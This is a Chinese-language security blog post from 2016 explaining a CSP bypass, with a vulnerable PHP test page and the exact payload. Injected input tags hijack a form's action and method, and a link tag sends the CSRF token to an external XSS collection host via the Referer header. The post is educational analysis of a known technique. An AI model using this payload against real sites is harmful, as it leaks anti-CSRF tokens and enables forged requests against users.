title: input属性bypass csp
date: 2016-04-08 20:45:44
tags:
- Blogs
- csp
- csrf
categories:
- Blogs
---

前两天看到一篇文章，可以通过input标签的某些属性，来控制form获取crsftoken并且完美bypass csp。

<!--more-->

文章的原文是在
[https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/](https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/)

首先测试环境设置`default-src: 'none'`禁止所有的js脚本，所以执行js是没办法了，但是却可以通过巧妙地方式csrf，这里使用的就是link标签，这里就不多说了，之前写过一篇文章专门讲link标签...

首先我们的测试环境是这样的:
```
<html>

<body>

<div>[Reflected XSS vulnerability here]</div>

<form method=”POST” id=”subscribe” action=”/submit.php”>

<input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” />

<input type=”submit” value=”Subscribe to newsletter” />

</form>

</body>

</html> 
```
我们可以看到很清楚的hidden标签，里面会在表单提交的同时提交csrftoken来验证来源，这样可以在开启csp的时候，很有效的防御csrf的发生，这里我们的插入点在form的前面。

```
<html>
<body>
<div><?=@$_GET['xss']?></div>
<form method="POST" id="subscribe" action="/api/v1/newsletter/subscribe">
<input type="hidden" name="csrftoken" value="5f4dcc3b5aa765d61d8327deb882cf99" />
<input type="submit" value="Subscribe to newsletter" />
</form>
</body>
</html>
```
我们可以插入input标签
```
<div><input value="CLICK ME FOR POC" type="submit" formaction="" form="subscribe" formmethod="get" /> <input type="hidden" name="xss" form="subscribe" value="<link rel='subresource' href='http://xss.xxx.cc'>"/></div>

```
我们上面是构造的输入，有些属性我们不是很熟悉，那么就先看看吧。
[http://www.w3school.com.cn/tags/tag_input.asp](http://www.w3school.com.cn/tags/tag_input.asp)


|属性	|值	 |描述|
|-------|----|----|
|formaction	| URL	| 覆盖表单的 action 属性。（适用于 type="submit" 和 type="image"）|
|formenctype	|见注释	| 覆盖表单的 enctype 属性。（适用于 type="submit" 和 type="image"）|
formmethod	| get&post | 覆盖表单的 method 属性。（适用于 type="submit" 和 type="image"）|
formnovalidate	formnovalidate	| 覆盖表单的 novalidate 属性。 | 如果使用该属性，则提交表单时不进行验证。|
formtarget	| _blank  _self  _parent  _top  framename  | 覆盖表单的 target 属性。（适用于 type="submit" 和 type="image"）|


我们这下就比较好理解上面的payload了，上面构造的input覆盖了下面这个表单的各个属性。

通过这种方式我们可以把csrftoken通过get请求的方式放在请求里面，然后构造了link标签去请求自己的xss平台，这样在xss平台上，我们可以看到请求的来源，referer里可以看到get中的csrftokeno(*￣▽￣*)ブ

忘了说，这里只有chrome能够实现，firefox无法实现